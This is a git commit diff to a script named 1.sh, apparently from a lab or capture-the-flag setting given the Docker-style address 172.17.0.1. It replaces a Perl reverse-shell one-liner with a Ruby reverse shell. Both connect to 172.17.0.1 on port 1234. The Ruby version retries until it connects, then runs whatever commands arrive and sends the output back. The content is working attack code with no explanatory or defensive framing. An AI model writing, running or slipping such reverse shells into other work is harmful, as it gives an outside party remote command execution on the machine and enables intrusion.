289bd8047c470208a1ed8f7f1ec31b3b23cd29a9
greg-wu <greg-wu@users.noreply.github.com>
2020-02-05 11:36:08 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,1 +1,29 @@
-use Socket;$i="172.17.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+#!/usr/bin/env ruby
+
+require 'socket'
+require 'open3'
+
+#Set the Remote Host IP
+RHOST = "172.17.0.1" 
+#Set the Remote Host Port
+PORT = "1234"
+
+#Tries to connect every 20 sec until it connects.
+begin
+sock = TCPSocket.new "#{RHOST}", "#{PORT}"
+sock.puts "We are connected!"
+rescue
+  sleep 20
+  retry
+end
+
+#Runs the commands you type and sends you back the stdout and stderr.
+begin
+  while line = sock.gets
+    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
+              IO.copy_stream(stdout_and_stderr, sock)
+              end  
+  end
+rescue
+  retry
+end
